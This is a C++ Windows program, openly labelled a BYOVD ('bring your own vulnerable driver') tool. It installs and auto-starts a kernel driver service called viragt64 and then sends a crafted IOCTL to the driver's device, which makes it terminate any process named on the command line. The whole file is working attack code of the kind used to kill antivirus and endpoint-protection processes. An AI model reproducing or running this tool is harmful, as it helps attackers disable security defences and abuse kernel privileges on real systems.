// Include necessary headers for input-output operations, strings, Windows API functions, and Unicode support
#include <iostream>
#include <string>
#include <Windows.h>
#include <tchar.h>
#include <vector>

// Define constants used in the program
#define MAX_PATH 260                    // Maximum path length
#define IOCTL_CODE 0x82730030           // Custom IOCTL code for communication with the device driver
#define DEVICE_PATH L"\\\\.\\viragtlt"  // Path to the device driver

// Structure used to pass data to the device driver via IOCTL
struct BYOVD_TEMPLATEIoctlStruct {
    char process_name[500];  // Buffer to hold the name of the process to be terminated
};

// Class that encapsulates the logic for interacting with a vulnerable driver
class BYOVD {
public:
    // Handles for the device and service control manager
    HANDLE hDevice;
    SC_HANDLE hService;
    SC_HANDLE hSCManager;

    // Constructor: Initializes handles and attempts to open or create the service
    BYOVD() : hService(nullptr), hSCManager(nullptr), hDevice(INVALID_HANDLE_VALUE) {
        // Open the Service Control Manager with permissions to create services
        hSCManager = OpenSCManager(nullptr, nullptr, SC_MANAGER_CREATE_SERVICE);
        if (!hSCManager) {
            std::cerr << "[!] Failed to open service manager." << std::endl;
            return;
        }

        // Try to open the existing service
        hService = OpenService(hSCManager, _T("viragt64"), SERVICE_ALL_ACCESS);
        if (!hService) {
            std::cerr << "[!] Service not found, trying to create it." << std::endl;
            createService();  // If service doesn't exist, attempt to create it
        }

        // Open the device associated with the driver
        openDevice();
    }

    // Destructor: Cleans up resources
    ~BYOVD() {
        cleanUp();
    }

    // Function to start the driver service
    bool startDriver() {
        SERVICE_STATUS_PROCESS status;
        DWORD bytesNeeded;

        // Query the status of the service
        if (!QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, (LPBYTE)&status,
            sizeof(SERVICE_STATUS_PROCESS), &bytesNeeded)) {
            std::cerr << "[X] Failed to query service status. Error: " << GetLastError() << std::endl;
            return false;
        }

        // If the service is already running, indicate this and continue
        if (status.dwCurrentState == SERVICE_RUNNING) {
            std::cerr << "[!] Service is already running. Current state: " << status.dwCurrentState << std::endl;
            return true;
        }

        // Start the service
        if (!StartService(hService, 0, nullptr)) {
            std::cerr << "[X] Failed to start the driver. Error: " << GetLastError() << std::endl;
            return false;
        }

        std::cout << "[!] Driver started successfully." << std::endl;
        return true;
    }

    // Function to open a handle to the device
    void openDevice() {
        // Create a handle to the device using the specified path
        hDevice = CreateFile(DEVICE_PATH, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hDevice == INVALID_HANDLE_VALUE) {
            std::cerr << "[X] Failed to open device. Error: " << GetLastError() << std::endl;
        }
        else {
            std::cout << "[!] Device opened successfully." << std::endl;
        }
    }

    // Function to clean up handles and resources
    void cleanUp() {
        if (hDevice != INVALID_HANDLE_VALUE) {
            CloseHandle(hDevice);
        }
        if (hService) {
            CloseServiceHandle(hService);
        }
        if (hSCManager) {
            CloseServiceHandle(hSCManager);
        }
    }

    // Function to stop the driver service
    bool stopDriver() {
        SERVICE_STATUS status;
        if (!ControlService(hService, SERVICE_CONTROL_STOP, &status)) {
            std::cerr << "[X] Failed to stop the driver." << std::endl;
            return false;
        }

        std::cout << "[!] Driver stopped successfully." << std::endl;
        return true;
    }

    // Function to kill a process by its name using the vulnerable driver
    void killProcessByName(const std::string& processName) {
        if (hDevice == INVALID_HANDLE_VALUE) {
            std::cerr << "[X] Device handle is invalid. Trying to reopen..." << std::endl;
            openDevice();
            if (hDevice == INVALID_HANDLE_VALUE) return;
        }

        // Prepare the data structure with the process name to be sent via IOCTL
        BYOVD_TEMPLATEIoctlStruct ioctlData;
        strncpy_s(ioctlData.process_name, processName.c_str(), sizeof(ioctlData.process_name) - 1);
        ioctlData.process_name[sizeof(ioctlData.process_name) - 1] = '\0';

        DWORD bytesReturned;
        // Send the IOCTL to the device
        BOOL result = DeviceIoControl(hDevice, IOCTL_CODE, &ioctlData, sizeof(ioctlData), nullptr, 0, &bytesReturned, nullptr);
        if (!result) {
            std::cerr << "[X] IOCTL failed. Error: " << GetLastError() << std::endl;
            return;
        }

        std::cout << "[!] IOCTL sent successfully." << std::endl;
    }

private:
    // Function to create the driver service if it doesn't already exist
    void createService() {
        TCHAR driverPath[MAX_PATH];
        // Get the current directory where the driver file is expected to be located
        if (!GetCurrentDirectory(MAX_PATH, driverPath)) {
            std::cerr << "[X] Failed to get current directory. Error: " << GetLastError() << std::endl;
            return;
        }

        // Construct the full path to the driver file
        std::wstring fullPath = std::wstring(driverPath) + L"\\viragt64.sys";

        // Check if the driver file exists
        DWORD fileAttr = GetFileAttributes(fullPath.c_str());
        if (fileAttr == INVALID_FILE_ATTRIBUTES) {
            std::wcout << L"[!] Driver file not found: " << fullPath << std::endl;
            return;
        }

        // Create the service with the specified parameters
        hService = CreateService(hSCManager, _T("viragt64"), _T("viragt64"), SERVICE_ALL_ACCESS,
            SERVICE_KERNEL_DRIVER, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL,
            fullPath.c_str(), nullptr, nullptr, nullptr, nullptr, nullptr);
        if (!hService) {
            std::cerr << "[!] Failed to create service. Error: " << GetLastError() << std::endl;
            return;
        }

        std::cout << "[!] Service created successfully." << std::endl;
    }
};

// Main function: Entry point of the program
int main(int argc, char* argv[]) {
    // Check if the process name argument is provided
    if (argc < 2) {
        std::cerr << "Usage: " << argv[0] << " <process_name>" << std::endl;
        return 1;
    }

    // Store the process name from the command-line argument
    std::string processName(argv[1]);
    // Instantiate the BYOVD class to manage the driver interaction
    BYOVD driver;

    // Start the driver and attempt to kill the specified process
    if (driver.startDriver()) {
        driver.killProcessByName(processName);
    }

    return 0;
}
